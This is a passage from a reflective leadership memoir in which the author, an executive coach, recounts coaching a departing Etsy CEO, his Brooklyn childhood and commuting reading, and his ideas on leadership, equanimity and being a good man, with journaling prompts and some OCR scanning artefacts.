Jerry, don’t you\nknow that this too shall pass?”\n\nShe was right, of course. I learned to use each heartbreak—be it the\nmemory of feeling bereft and ripped open by heartache or a present\nexperience of being overwhelmed by disappointment and grief—as a\nreminder of that wisdom.\n\nThe hole in my chest—the space between wishing for a world that could\nbe and seeing the world as it is—was filled by the blessing of equanimity\nand the gravity of life at times when I was felled by the deaths of loved\nones, dreams, and trees, but also enlightened and lifted by grace. Met by\ntrue grit, my heartbreak gave way to true belonging, true peace of mind, and\ntruly coming home.\nJournaling Invitations\n\n* How has my heart been broken?\n\n* What have I learned about myself as a result of that\nheart being broken?\n\ne In what ways do I embody resiliency?\n\n* What does a life of peace and equanimity feel like?\nChapter 9\nLeadership and the Art of Growing\nUp\n\nFor Parker\n\nLilac, honeysuckle, and diesel fumes perfumed the air as a stream of cars\nthumped across the expansion joints of the Brooklyn Bridge. On that late-\nspring night, Chad Dickerson and I shared tears and beer while considering\nnot only the course of our lives but especially the twists of the most recent\nweeks.\n\nWhat had led Chad to be fired from his role as CEO at Etsy? What had he\ndone wrong? Had he been the CEO we both thought he was?\n\nI struggled with my own doubts. Had I, his coach and consigliere, failed\nhim? Had each of us, in our own way, simply not been good enough? We\nsat beside each other on the top of the picnic table, shoulders nearly\ntouching, allowing our broken-open hearts to lead us both to a place of\ninquiry and warriorship.\n\nWe took in the possibility of each of our failures. We considered all that\nwe’d done right and all that we’d regretted. And—our backs unbent—we\nclinked bottles and toasted, acknowledging how much we’d each grown.\nWe knew that Chad, in announcing his departure and leaving the team he’d\nled for six years, would have to bring forth the dignity and grace that lay\nwithin his body since his North Carolina boyhood. The grace and dignity of\na man toiling at a project not because it might bring wealth or approbation\nbut because it was his job to do it. Standing next to him, I glimpsed the\nstrength of his father, who led road repair gangs, making the highways safe\nfor North Carolinians to drive to work, to school, to church, to the store for\na loaf of bread. Good work, done well, for the right reasons.\n\nAs I think back—under those bright stars—it wasn’t just Chad’s warrior\nthat emerged. I, too, was transformed. I, too, had to reach deep inside to\nfind and take my seat.\n\nThat late-spring night, two men sat on a picnic table on a Brooklyn\nrooftop as cars and trucks pounded out a ceaseless rhythm. Two men sat on\na rooftop and rediscovered the true leaders, the true warriors, the true adults\nwaiting to come forth. As the lilac-honeysuckle-diesel-perfumed air filled\ntheir lungs, it mixed with a hint of the sticky-sweet smell of sour lemon\ndrops, and the two men used those stars to chart a way ahead.\n\nWhile Chad began to find his post-CEO way that night, I, too,\nrediscovered the warrior within. A decade ago, in a desert in Utah,\nGrandfather Boulder instructed me to listen and, in so doing, open that\nwhich pain had closed. I cut short my wondering if his pain was my failing.\nI let go of that fear, knowing this scene wasn’t about me. I saw clearly that\nmy job had never been to save, to fix, or to prevent my friend from failing.\nMy job remained what it had always been: to listen, to bear witness, and, in\ndoing so, to midwife the birth of the warrior.\n\nMy work isn’t to save anyone from the heartbreak of everyday—not my\nclients, not my children, not my friends, not my loves. If I were I to manage\nto pull it off, I would end up standing in the way of their finding\nequanimity. My work is to bear witness to the growth of those whom I love\nand care for. My work is to stand shoulder to shoulder, as when two men sat\non a rooftop and found their way to the love, safety, belonging, and\nequanimity of brokenhearted warriors.\n\nTaking your seat; allowing your heart to break and stay open; accepting\nall the ways you strive to feel love, safety, and belonging allow you to let go\nof the striving and welcome in equanimity.\nStriving No More\n\nThe angle of the late-afternoon Colorado sun intensified both its light and\nheat. I moved to lower the shade, cutting the glare and the burn. My friend\nBrad Feld and I sat on his back porch while his golden retrievers vied for\nour affection. We spoke of big and small things. We reminisced. We\nrecalled stories from two decades of friendship. We caught up on recent\nstories, present-day stories, of lives unfolding, hearts breaking, and the\ngravity that comes from becoming more and more ourselves.\n\n“T’m working harder than I’d like,” he tells me as we both nod,\nrecognizing the tendency in each of us to do that. We know that neither of\nus will ever really stop working; for us, working means thinking, talking,\nconnecting, and creating. “The difference now,” he says, referring to his\nfifty-something self, “the difference from earlier in my life is simple: I’m\nno longer striving.”\n\nSeat taken, he no longer needs to define himself by what he’s doing. Seat\ntaken, he can allow the sadness of everyday heartbreak—his and that of\nthose he loves—to wash over and through him. Seat taken, the gentle,\nopenhearted warrior emerges, and we laugh and speak of our approaching\nelder-hood.\n\nTaking your seat leads to equanimity. Taking your seat means defining\nyour life. Acknowledging that which you’ve come to regret while seeing the\npossibilities in all that’s before you. Seat taken, you get to define your\nleadership and your life. Or, I suppose, your life in this moment, for the\nprocess of becoming doesn’t ever end. It’s always unfolding. Life is growth\nand change, and while the impermanence of time passing is heartbreaking,\nit creates the ground from which the new me, the warrior in me, emerges.\nThis is life unfolding as intended. This is becoming the warrior adult. This\nis the gift of leadership. This is the art of growing up.\n\nThe Gifts of Leadership\n\nSo much of what I’ve learned about growing up came from learning to lead.\nIn fact, the process of becoming me made me a better leader. The two\nprocesses, becoming a leader and becoming ourselves, are intertwined and\ninterdependent; better leaders are better humans and better humans are\nbetter leaders. Leadership lessons, then, are, at their core, lessons in\nhumanity.\n\nSometimes the belief systems that are most difficult to overcome aren’t\nthe ghosts in the machine of our childhood. Sometimes the most difficult\nbelief systems fall under the rubric of “conventional wisdom.”\nConventional wisdom, for example, dictates that, in our process of\nbecoming warrior-leaders, we focus on the hard things. Big rocks, folks say\nknowingly. “Break down the big rocks and then focus on the little rocks.”\nBut how do you discern a big rock from a little rock?\n\nMoreover, when we’re in that hair-on-fire state, and the Crow is cawing\nrelentlessly about the risks of failure, even the easy things become hard.\nConventional wisdom doesn’t tell us that when you care so much, when the\nrisk of heartbreak is so high, when the potential loss of respect and self-\nesteem and the risk of humiliation and attendant shame from your bitter and\nsure defeat by life are so great, it’s all big rocks and it’s a// hard. But with\ndiscernment, with radically inquiring within, we can separate the hard and\ncomplicated from the hard and simple. In fact, forget focusing on the easy\nor hard; learn to distinguish between the complicated and the simple.\n\nRunning a business, for example, is simple. As my grandfather would\nsay, just make sure you have more money at the end of the day than you did\nat the beginning of the day. Make sure you have enough money, so your\ngrandson can always find safety and love in a canister of lemon drops.\nSimple but hard.\n\nWhat makes hard things like running a business complicated is leaders’\navoiding doing their work. When we don’t do our work, we stand in the\nway of our own growth. When we fail to grow, we hold back others, and we\nwarp and twist the organizations we seek to serve. We turn the work of\nothers into the work of covering up our failings, plugging the holes in our\nchests, and living out the commands of the ghosts in our machines. What\nmakes all of life complicated, and not just hard, is this unwillingness to do\nthe work that’s ours to do; our unwillingness to live the examined life.\n\nWhen leaders fail to look at themselves, they turn their inner turmoil and\nvery human contradictions outward. Further, unable to face their fears, they\nmask the anxiety with aggression. As my friend and mentor Parker Palmer,\nteaches, “Violence is what we do when we don’t know what to do with our\nsuffering.” Violence to our planet, violence to our communities, and\nviolence to ourselves are what we do when we refuse to look inward and\nwork with the heartbreak of the everyday.\n\nSome of us seek to create havens to shelter ourselves from the rigor of\nthis work. ۷۰۱۱۱ give ourselves over to an existential materialism, seeking\nrefuge not in the rigor of the truth of life as it is but in spiritual and\npsychological delusion. Such havens are spawned when we convince\nourselves that we’re done with inner exploration or we assure ourselves that\nthe organizations we’ve created are havens of love, safety, and belonging,\nnever checking back, though, for fear that we’re wrong.\n\nWe need to be vigilant and rigorous in cutting through our delusions.\nSuch havens, warned James Baldwin, are “high-priced.” They can demand\nof us that we live the unexamined, delusional life. “TI still believe that the\nunexamined life is not worth living: and I know that self-delusion,” wrote\nBaldwin, “in service of no matter what small or lofty cause, is a price no\nwriter can afford.” No writer, Ill add, no leader, and, finally, no adult.\nParaphrasing Baldwin, I’d say that a leader’s subject is himself and the\nworld and “it requires every ounce of stamina he can summon to attempt to\nlook on himself and the world as they are.”\n\nSeeing ourselves and the world as they are is a cornerstone of good\nleadership and the well-lived adulthood. One of the most startling\nchallenges I will put to a client comes from my bastardization of a Zen\naphorism: This being so, so what? Things being as they are, what will you\ndo about it?\n\nAvoiding havens of self-delusion, maturing with a fierce regard for the\ntruth of who and how we are, allows us the grace and freedom to live with\ncontradictory, confusing, and ambivalent feelings. Dr. Sayres taught me that\none of the hallmarks of mental health is the ability to hold conflicting\nfeelings. Acknowledging that we hold those contradictions, accepting that\nwe can both love and hate precisely the same things, is core to accepting\nourselves all the way down to our bones.\n\nContradiction and ambivalence, then, are not further evidence of our\nfailings. We so fear being labeled hypocrites that we cast about for masks,\nlest people see our ambivalence as weakness. Just as we, as adult humans,\ncan both love and hate, we, as human leaders, can be both terrified and\nexcited by the future.\n\nThe leader fears failure and yet believes in the team’s potential to\nsucceed. Parents fret over their childen’s skinned knees and broken hearts\nbut celebrate their separation and individuation. Partners allow the space for\nboth love and fear in the relationship, trusting that the irrational messiness\nof their vulnerable and real selves will be wholly, unfailingly, and lovingly\naccepted. In doing so, in accepting that within themselves, they create a true\nhaven whereby their person, their Other, can be wholly, fully, their messy\nselves trusting that they, too, will be lovingly accepted. Stepping out of such\nhavens, we are called upon to be loved, to be made safe, and to know that\nwe belong not despite our failings but with compassionate regard for the\ngifts of our imperfections.\n\nLeading and living in this unsheltered way invite us to take our seats as\nthe most caring, most calm voice in the room—in our relationships, our\nfamilies, our companies, and our communities.\n\nMy co-founder, Ali Schultz, taught me the wisdom of horses. Horses,\nwith their supernatural ability to use their limbic nervous systems to discern\ntruth and congruency, do not base their choice of the leader of their herd on\nstrength or intellectual wisdom. Nor is their choice based on which member\nmight keep the herd safe from a predator wolf. They choose the one who\nfeels the group best and who cares the most. They choose the horse—\nusually a mare—who is most capable of holding that care in a way that\ncalms the whole group. They’re marked by the attunement to the inner and\nouter needs of those they have the honor to serve and lead.\n\nWhen leaders allow themselves the grace of being fierce with the reality\nof their messy broken-open hearts—the truth of life as it is and not as they\nwish it to be—the individuals in the group are offered the opportunity, as\nare our loved ones, to let go of their fears of failing or disappointing and\nfocus on the business at hand; the worthiness of the shared task as well as\nthe personal tasks of growing up and into their fullest potential as humans.\n\nThis being fierce with the reality of what is requires the bravery to ask of\noneself three challenging and yet powerfully liberating questions:\n\n* What am I not saying that needs to be said?\n* What am I saying (in words or deeds) that’s not being heard?\n* What’s being said that I’m not hearing?\nDr. Sayres taught me those questions to release me from the grip of my\n\npsychosomatic migraines. In doing so, she gave me—and all those with\nwhom I’ve now worked—the gift of prajna.\nMy New York office is decorated with soothing blues and photographs\ntaken from the various wondrous places I’ve visited. My main chair, the\nseat I take when I’m coaching, is placed opposite a couch and under a photo\nfrom game one of the 2000 World Series (when my beloved Yankees\ndefeated the Mets). Most clients will sit on the couch and I can emotionally\nhold them while we do the work. Out of their sight, and well within my\nview, is a statue of Manjushri, one of the oldest of the many Buddhist\nbodhisattvas. My golden Manjushri wields a flaming sword, representing\nthe transcendent wisdom that cuts down ignorance, duality, and delusion.\n\nWhat am I not saying? What’s really going on? What confusing and\ncontradictory emotions are blocking our insight and wisdom to know the\nway forward? The leader best able to cut through the miasma of confused\nand conflicting emotions, to answer such questions and see the nature of the\nreality of the organization’s triumphs and struggles, is best able to calm and\ncare for the herd. But wielding the flaming sword demands that we do our\nwork, now and forever.\n\nFinding Your Way\n\n“TI came to explore the wreck,” wrote poet Adrienne Rich in Diving into the\nWreck, “not the story of the wreck / the thing itself and not the myth.”\n\nWe dive into the wreck, make our way to the back of the cave, to retrieve\nthe treasure. We use our words, as Rich says, as maps to our purpose. Our\nradically inquisitive questions are spades. A leader’s work, now and forever,\nis to turn the muck of the ocean bottom and find the way.\n\nDr. Sayres’s questions gave me courage while honoring my cowardice,\nmapping my purpose and my way. Here are your spades, questions to ask\nyourself so that you might reboot your leadership and move forward on\nyour journey of growing up.\n\n* How would I act were I to remember who I am?\n\n* What choices would I make, what actions would I take, if I\nregularly said the things that needed to be said?\n\n* Who would I become were I to be fully, completely, and wholly\nheard?\n* What is it that I wish the people in my life understood about me?\n\n* Who would I be without the myths I’ve told about myself; the\nstories that took hold when I was yearning to feel love, safety, and\nbelonging?\n\nFirst, having turned that muck, we then create the embodiment of our\nwishes and dreams: our organizations, our communities, our society. So\noften I’m called in to help lead conversations about mission, value, and\npurpose. When, really, the only questions that matter are those that tell us\nwho we are and wish to be.\n\n* How would our organization respond were we to hear all the things\nthat are being said, regardless if they are being said with words or\ndeeds?\n\n* What does it mean to be a leader at our organization?\n‏٭‎ What does it mean to be grown, a fully actualized adult?\n\n¢ How would we feel if our children were to work for the company\nwe’ve created or the team we lead?\n\n* How has the unsorted baggage of what has happened to us shaped\nwho we are as leaders?\n\n* When our employees and colleagues leave our sides and our\ncompany, what do we want them to say about our time together?\n\n* What do we believe to be true about the world?\n\n* What do we, as a community of people working toward a common\ngoal, believe the world needs?\n\nRegardless of the myths we are telling ourselves, what kind of company\nor organization are we truly building?\n\nAt the end of our days, are we becoming the person we’d like to be? A\ngreat, guiding point to that question is yet another question: What kind of\nadults do I want my children to be or become? Whoever that might be, we\nmust be that person now, to map out the path of becoming that will help\nthem, in their time, to do their work and retrieve their sunken treasure.\n\nParker and I had one of our epic conversations in which we laughed as\nmuch as we spoke. We came to realize that the only answer to the\nexistential question of “Does my life have meaning?” is, again, another set\nof questions: “In what ways have I been brave?” And “How have I been\nkind?”\n\nOnly by standing still, asking ourselves such questions, and listening to\nthe answers, will we finally find the warrior-leader within. Only then do we\nget to grow up and become the adults that are our birthright and\nresponsibility. If we stand still, we may not like what we hear. We may be\nfrightened by what our soul tells us: I don’t want to be CEO. I don’t want\nthis life. I’m meant for something or someone else. Asking ourselves such\nopen, honest questions takes courage, for the answers may frighten us,\nchallenging our working belief systems. If we hear answers that surprise,\nconfuse, and upset us, we'll have to confront a terrifying follow-on\nquestion: “Now what do I do?”\n\nMy friend Al Doan, the co-founder of the Missouri Star Quilt Company,\nstood still, turned over the muck, and decided to leave his job as CEO. A\nfew months later he met Drea. They were married a year later.\n\nMonths after our rooftop beer toast, Chad and I sat still and silent. The\npause in our conversation was lovely, deep, nourishing. Side by side, we\nwatched his young son push a toy bulldozer through a sand pile at a\nBrooklyn playground and turned the soil of his transition out of Etsy. We\nlaughed at his decreased need to vomit as a result of the stomach-churning\nroller-coaster ride of being a CEO. We laughed at the imagined fears of\npost-CEO life. We relished his relaxed ways and his ability to appreciate the\nslant of light, the smell of the rain, and the joy in hearing his son’s delighted\nsqueal—Look, Dad, look!”—at some suddenly revealed magic. He then\nturned quiet and thoughtful as his son buried my hand in the sand of an\nimagined construction site. Chad turned to me with a realization of the true\nnature of post-CEO life: “Ya know,” he said with a chuckle and a shake of\nhis head, “once you’re a leader, you’re always a leader. You kinda have no\nchoice. You can’t put it back in the box.”\n\n“And I guess, once you’re a warrior,” I laugh in response, “you’re always\na warrior. You don’t really have a choice about that, either.”\n\nAs I write these words, Chad has sent me text messages. He and his\nfamily are headed out for a long-wished-for cross-country drive. “All my\nnew life infrastructure is working well,” he wrote. “Sleeping well, have a\ngreat doctor, finances are humming, etc. Feeling good. Xoxo.”\n“This is how life is supposed to be,” I wrote back. “This is what your son\nneeds from his dad. Enjoy it.” Even if you don’t always act like it, I realize,\nonce you’re an adult, you’re always an adult.\n\nAs I close out this chapter, I swap stories and old-man remembrances\nwith my friend Steve Kane. I ask him, “Did you ever regret not taking\nGamesville public?”\n\nNot really, he tells me. “All my co-founders and I ever aspired to was to\ncreate a great business where we could have stimulating, enjoyable work\nfor ourselves and our staff and make a great living.” Good work, done well,\nfor the right reasons.\n\n“We were ‘entrepreneurs’ when all that meant was being lonely and\nscared and very different from everybody else we knew,” he continues.\nThose folks “were busy working their way to success and prosperity,\nclimbing up various ladders, not risking it all on some ambitious but super-\nrisky idea.” He adds, “We just wanted to be our own bosses and make a\ngreat living.”\n\nMost of us will spend our days in some sort of work. All of us lucky\nenough to be healthy will grow older. Those two realities give us a\ntremendous opportunity: use the work we need to perform to keep ourselves\nsafe to grow into the adults we were born to be. The greatest gifts of\nleadership are its challenge to remember who we are and the opportunity to\nbecome the grown-ups we were meant to be.\n\nAn Artist of My Days\n\nFor me, this has meant integrating words into my daily life. For the man I\nam meant to be is someone who understands the liberating power of words;\nothers’ as well as mine. This awareness began as so much of my growth\nbegan: during long stretches of alone time. In this case, it was while I would\ntake the subway from my home in Queens to my high school in Brooklyn. I\nstarted high school while we still lived in Brooklyn. Then, in the middle of\nninth grade, my freshman year and following a fight between my parents,\nmy mother and I moved to Queens while my father and two of my brothers\nstayed back in Brooklyn. Technically, I violated the rules, as my high school\nwas zoned only for those kids who lived in Brooklyn.\nBut with all the disruption in my life caused by my parents’ separation, I\ndidn’t want to change schools as well. What’s more, we were never sure\nhow long this separation was going to last. Like many other aspects of our\nfamily life, it wasn’t really discussed. One day, a few months later, my\nfather and my brothers simply moved in with us.\n\nThat move changed my life. I began spending three hours a day\ncommuting, most often alone. To pass the time, I would do my homework\nand I’d read. I first began reading The Lord of the Rings on the A train from\nLefferts Boulevard to Jay Street in downtown Brooklyn. I escaped the\npressures of the subway, home, and the stress of the commute, and found a\nhaven in Middle-earth.\n\nI found comfort in other worlds. By reading closely, I discovered that all\nwriters—whether they were writing about Frodo taking his seat as a broken-\nopen-hearted warrior at the gates of Mordor; or how Zorba (the Greek)\nmelted into the grief of his young son’s death by dancing until his heart\ncould cry no more; or how the mysterious, unnamed Invisible Man savored\nthe sweetness of a hot-buttered yam on the streets of Harlem; or how a\n“nicens little boy named baby tuckoo” would grow into a young man and\nartist named Stephen Daedalus—were essentially telling the same story:\ntheir own. While reading others’ words, I began to discover my own.\n\nI remember once holding on to the train car pole as the A train swayed\nsickeningly, reading of the twisted interplay between Raskolnikov and\nSvidrigailov in Crime and Punishment. I was nauseated by Raskolnikov’s\nstruggles with his overwhelming guilt and his burning hatred for his foil, his\ncounterpart. I was so overcome with nausea that I had to grab the first seat\navailable. I put the book away and took out a black-and-white “marble”\ncomposition book and began writing. That was the beginning of a lifetime\nof journaling. That was the beginning of finding my words.\n\nThis dance between the words of others and words of my own deepened\nover the next few years. Early on in my commuting years, I learned to hack\nmy journey. I shaved twenty minutes off the long commute by exiting the\nsubway, the A train, at Jay Street, going above ground and walking a few\nblocks to the Lawrence Street station to get to the M train. I used my\nsubway pass—something that enabled all students to ride the subways for\nfree—to switch to the M train . . . the M bound for Coney Island . . . which\nwould take me to the station closest to my high school.\nTechnically, this was a violation, as the pass was to be used only at my\nschool and home stations, but that would have required riding the A into\nManhattan, where I could switch to the M while remaining underground.\nMy little hack created the conditions for yet another asteroid to hit me.\n\nEach day, as I made my way from Jay to Lawrence, I’d pass Binkin’s\nBooks. One day I couldn’t contain myself and I wandered in. Mr. Binkin sat\nwheezing behind a cash register and a pile of books. And there were books\neverywhere. Piles and piles of books. Dirty, dusty, musty books. I was in\nheaven; I’d found another haven. I’d visit Binkin’s every day. I’d wander\nthe aisles. Every now and then, someone would come in and ask Mr. Binkin\nif he had a certain book. “I have no idea!” he’d growl between wheezes.\n“Go find it yourself.” Most folks would storm out.\n\nOne day I sat in the corner, my backpack at my feet. I had a boxed\nedition of [vanhoe on my lap and was scribbling in my composition book,\nmy journal. Suddenly Mr. Binkin came from behind his counter, shuffling\nand wheezing as he squeezed his considerable bulk past the musty piles. He\ntossed a book into my lap. “Here . . . you’ ll like this.”\n\nWe had never spoken more than a word or two—usually just him telling\nme how much he was charging me for some tattered book I held at the\ncounter. I think the most frequent thing I heard him say was, “Fifty cent.” I\nlooked down at my lap, and there was a tattered copy of Call It Sleep by\nHenry Roth.\n\nEven then I knew that no matter how much I identified with him, I wasn’t\nDavid Schearl, the main protagonist. The facts of our lives were just too\ndifferent. But the feelings of our lives mirrored each other’s. Later, when I\nwas aman, I came to understand Roth’s story and the poignant, painful\nstory of his novel having been forgotten for decades, only to have been\ndiscovered in a remainder rack by a literary critic. Long after Roth had\ntraded the life of an author for the life of a Maine woodsman and duck\nfarmer, he remembered who he was, rediscovered his words, and overcame\nhis wordlessness.\n\nThe twin asteroids of Binkin’s and Call It Sleep helped me begin to find\nmy words. For in my youngest days, I felt wordless, and that wordlessness\nled me to try to end my life. In retrospect, that attempt—at eighteen—\nwasn’t merely a crying-out as folks are wont to say but a desperate attempt\nto speak, to cut through, to say what it was that needed saying.\nPerhaps the trajectory of my leadership journey has been simply about\nlearning to find the words. When I was a reporter, I looked to say what\nneeded to be said about the world as I was experiencing it. Later, as an\ninvestor, it was my ability to clearly see the world that was emerging as\nwell as the warriors within the entrepreneurs seeking funding that led me to\nwhatever financial success and approbation I enjoyed.\n\nWriting, coaching, teaching, being present, serving others—this is what I\nwas meant to do. I am becoming the man I was meant to be. When I fail to\nlive into that truth (as I assuredly and frequently do), I’m heeding the worn-\nout admonitions of my Loyal Soldiers and living from my shadow. Part of\nmy trajectory has been learning to accept my frailties, shortcomings, and\nthe myriad clever, insidious ways I act out the parts of me I’d rather not see.\n“Writing,” notes the poet Terry Tempest Williams, “requires an aching\ncuriosity leading you to discover, uncover, what is gnawing at your bones.”\n\nRetrieving those parts of me, uncovering what’s been gnawing at my\nbones, has allowed me to find a source of strength, wisdom, and creativity.\nAs I become more cognizant of the parts of me about which I can feel\nshame, I am more willing to admit to myself that I fail time and again to\nlive up to the best aspirations, and as a result, my sense of spirit and\nworthiness grows. My great guide, the beloved poet John O’ Donohue,\nreminds us, “Each of us is an artist of our days. The greater our integrity\nand awareness, the more original and creative our time will become.”\n\nWhatever the originality and creativity, whatever the leadership and adult\nwisdom that I carry, stem from the lessons I’ve learned from those who\nhave come before me. For when I’m reading, I’m uncovering the truths they\ndiscovered. When I’m journaling, I’m discovering my own truth. When I’m\nwriting, I’m speaking the truths that come from the synthesis of the truth of\nothers and my own words, my own truth. To be a good leader, I’ve had to\nlearn to be as honest as I could, facing down the shame-producing caws of\nthe Crow. To be a good leader and a good writer has meant learning to be an\nhonest, non-deluded adult. To be a good writer, I must be an honest man.\nBuilding Castles, Slaying Dragons, and 1২000001115\nMe\n\nI can’t think of a sadder way to die than with the knowledge that I never showed up in this\nworld as who I really am. I can’t think of a more graced way to die than with the\nknowledge that I showed up here as my true self, the best I knew how, able to engage life\nfreely and lovingly because I had become fierce with reality.\n\n—Parker Palmer, On the Brink of Everything\n\n“Why are you so obsessed with this good man thing?” Ali asked, her voice\ntinged with a mix of fear and frustration. She was tired of my\ngroundlessness. Perhaps she saw in me what I often fail to see and so is\nupset by the stories I tell about myself and the questions that plague me.\n\nWhat is a good man? Have I been a good father? Do I even have a\nsuperpower? Am I the impostor the Crow tells me I am? I turn over these\nquestions repeatedly.\n\nA good man takes care, answers a voice in my head; that of my father,\nperhaps, or my Grandpa Guido? A good man, as I’ve been repeating lately,\nbuilds castles, slays dragons, and, if he’s opened his heart, tends the hearth\n—building a fire against the cold, empty night so that his loved ones are\nsafe, warm, and happy. Hand-built castles and slain dragons give those he\nloves safety and belonging.\n\nOn a walk on a hill in Marin, thankful for the gift that is California, I met\nan ancient tree, toppled by age, blight, and wind. Stopping in my tracks, I\nrealized, Here lies a good man. If, at the end of my days, as this current\nmeat bag starts its inevitable transition to the Earth that birthed me, I can lie\nas majestically about the soil as this elder, 111] know that I earned my\nmanhood.\n\nHis body ragged with the scars of actions he may not always have been\nproud of but resting in the knowledge that for fifty, sixty, or one hundred\nyears he grew into his purpose: sheltering others, providing them a respite\nfrom the glaring sun, the toppling wind, and the painful vagaries of life.\nGnarled and twisted by inaction, decisions taken and not taken; scarred by\nselfishness, with limbs stretched by acts of kindness, generosity, and\ngentleness; I wish to end my days stretched out on the side of a hill,\nwelcoming the slow decomposition of my anxieties and my flesh into\nnourishing earth.\n\nYears ago, I had an epic dream—the kind that teaches you about yourself.\nI had returned to a past job, the place where I became an adult and a father.\nWorking this gift from my innermost being, I found myself articulating\nfiercely my purpose: to serve others in their pursuit of their own becoming.\n\nTo do that, I’ve modeled myself after my teachers, stepping into their\ngiant, impactful footsteps; they who taught me that the way to guide is to\nask and not to tell. There’s an indescribable power in a well-asked question;\nquestions that are open-ended and honest (honest in that I couldn’t know the\nanswer) allow my clients’ souls to speak.\n\nWhen they ask me how to be a better leader, 11] often ask them to tell me\nwhat they think it means to lead well. “How should I build my company?”\nis met with “What kind of company do you want to work for?”\n\nI know I frustrate them. Like my being frustrated by Ani Pema Chédrén’s\nadvice to follow the “pathless path,” I know they simply want answers. And\nbeyond sharing my observations about my own journey, and my own\nlessons learned, all I can offer is questions.\n\nWhat kind of leader are you? Tell us and teachers will guide you,\nreflecting when you’re leading with congruency. For me, I’m a leader who\nrelies on the power of words to convey meaning and purpose, to find the\nempathy that allows a team to coalesce and cohere.\n\nTell me what success and failure mean for you and we can use your\nanswers to chart a path. Tell me if, after imagining your children working\nfor your company, you feel shame, fear, or pride, and I'll tell you if you’re\nbuilding a worthwhile company.\n\nWhat do you believe about the world? Is the world a harsh, dog-eat-dog\nworld or is it, despite its obvious failings, a life-giving generative gift from\nthe divine? What do you believe about people? Are they out to optimize\nonly for themselves or are they simply stalled, blocked by the ghosts in\ntheir machines, waiting to be led to a place of full actualization, full growth,\ninto warrior adulthood?\n\nBack on that hill in Marin, the toppled tree brings me back to the chestnut\ntree of my childhood—my friend, my sanctuary. I weep at the comparison.\nThis gnarled oak got to live out its days while my friend ended in a pile of\nsawn logs and dust. At its base, near where the massive root system had\nbeen ripped from the earth, irises were sprouting. I want then to be reborn\nwith the bright promise of young irises. A good man, a good leader, a\nwarrior, a grown-up takes pride in his aspirations without using failure to\nachieve those aspirations as evidence of his unworthiness, his unlovability.\nHe also gives that to his children, his loved ones, his partners, his friends,\nhis colleagues, and all those whom he encounters.\n\nI think again of my proofreader dad’s Parker pen, the one he’d use to\ncomplete the puzzles in the Daily News, the one he’d use to correct the\ntypos in the paper, the one that never left his side. I loved that pen, for I saw\nin it an instrument of his care and his efforts to be a good man. Abandoned\nas a baby and given over for adoption, he, like my mother, did the best he\ncould. I think of Mom’s weekly deposits to her Christmas club savings\naccount—a dollar here, five dollars there—saving and saving so that, come\nChristmas, she could buy us the toys that would make us squeal with\ndelight. One of the sweetest, most joyful memories of my life is of my\nbrothers Dom, John, and me tearing the wrapping off our matching\naluminum suitcase-style play sets: Dom got the Viking set, John the frontier\nfort, and I got the miniature space-travel launch center with “real” rockets\nthat sent astronauts to the moon and exploring asteroids and shooting stars.\n\nMom and Dad were, of course, both toppled by age and illness; their\nbodies, hearts, and minds bore the scars and twisted limbs of the vagaries of\nlife. Those two may have been gnarled and twisted by their fears and the\nviolence of the abandonment and anger of those who came before them, but\ntheir limbs were also stretched by acts of kindness, generosity, and the\ntremendous courage and will to do right by their children and\ngrandchildren.\n\nA few weeks before my son Michael was to turn twenty-one, he and I sat\ndown at a table. He stared off into the backyard of what was the home in\nwhich he and his brother, Sam, and sister, Emma, had come of age. Staring\noff, we spoke of the fearful potential of his life. The awful and awe-filled\npossibilities as he imagined his future life, with his college years ending and\nthe rest of his years beginning. He laughed when I shared the title of\nParker’s latest book, On the Brink of Everything. “That’s it!” he said.\n“That’s exactly how I feel.” Parker, writing about life from the vantage\npoint of his late seventies, had spoken to a young man, a good man, in his\nearly twenties. On the brink of everything and facing the future, with fear,\ntenacity, excitement, and curiosity.\nThis is how we grow. Irises sprouting at the base of the toppled-over sage\ntree, one who’s served the world well and is taking his deserved rest dying\nin such a graced way.\n\nBecoming Me\n\nMy pursuit of lemon drops and Monopoly money had left me wealthy but\nempty. When I was circling the street above the stinking, smoking hole of\nGround Zero, I hadn’t yet put to rest the ghosts in the machine of my\nchildhood. Money in my pocket did little to quiet the lingering shame and\nguilt I felt, watching my father blow air into an empty wallet when I asked\nfor the funds to apply to college.\n\nNo matter the success I had, no matter the headlines I garnered, I\ncouldn’t quiet the warnings of my Loyal Soldier, who whispered the\nmisplaced, childlike logic that, to save myself, I had to deplete myself; that\nto belong, to be safe, to be loved, I had to die. I was trapped by this logic. It\nseemed that the only way to earn what I had, the only way to earn it—the\napprobations, the lemon drops, the safety I sought, the right to see myself as\nan adult, a good man—was to give and give like the fairytale gingerbread\nman being eaten by the fox: “I’m a quarter gone... ’m half gone... I’m\nthree-quarters gone . . . I’m all gone!”\n\nBut the rebooting of my internal systems helped me understand that the\nworld isn’t a fox out to eat us. The world doesn’t really want to harm us at\nall. It may wish to shape us, to change us into something other than who we\nwere born to be. It will give us facile playbooks on how to be a leader. 101]\ngive us subtle and gross signs that we are not what it needs us to be. But it\nisn’t out to eat us. It merely wants from us the ability to fill the hole in its\nchest.\n\nLike each of us, our colleagues, our lovers, our friends all want love,\nsafety, and belonging. They merely, unconsciously, see in us the potential to\nmeet that need. So, we become the objects of their projections, the screen\nonto which they project their own shadows. Wanting to belong, we\ncooperate. We become our employees’ disapproving parent, the foil in their\ncomedy act, the fun-house mirror reflecting the view of them they want to\nsee, the partner against whom they struggle so that they can grow. We\nbecome their Irrational Other, so they can stumble, skin their knees, and\nfind their own way. In this way, the world can ask us to give more and more\nuntil there’s less and less of us. Perversely, then we are often rewarded for\nour complicity in this dance. Lemon drops and the envy of others can be\nours for the taking.\n\nThe world affirmed me for giving more and more, for allowing my hair\nto catch and remain on fire, for giving and giving until I became the\ngingerbread man. I gave because I wanted to belong. But the more I gave,\nthe more I lost. And the more lost I became.\n\nYet we are more than the ghosts in our machines. We can stand still,\npower down, reboot the systems, and disrupt the programing. We need to\nhave the courage to be truthful and break through our delusions and accept\nthe “this being so” of life.\n\nI will always be haunted by lemon drops, sawdust, and the power of\nwords. I am grateful this is so. Out of such pain, such suffering, and the\nmuck and mud of my ocean bottom, a tall, strong tree of a man has\nemerged. I overcame the wordlessness of my youth. I became a good man\nby learning to love words—first, those of others; then, later, my own words.\nI became who I was born to be by learning to read and then, later, to write. I\nlearned that a life well written is a life well led. I became a good leader and\nI’m still becoming a good man. That is my legacy: the wisdom of knowing\nthat the act of becoming a good man is more important than arriving at that\nplace. With that, I’ve begun mastering the art of growing up.\n\nJournaling Invitations\n\n* How will I know my work is done?\nAfterword: A Light Heart Lives\nLong\n\nAs this book came alive, life’s roller coaster continued unabated. In the just\nmore than a year since I began writing, one friend 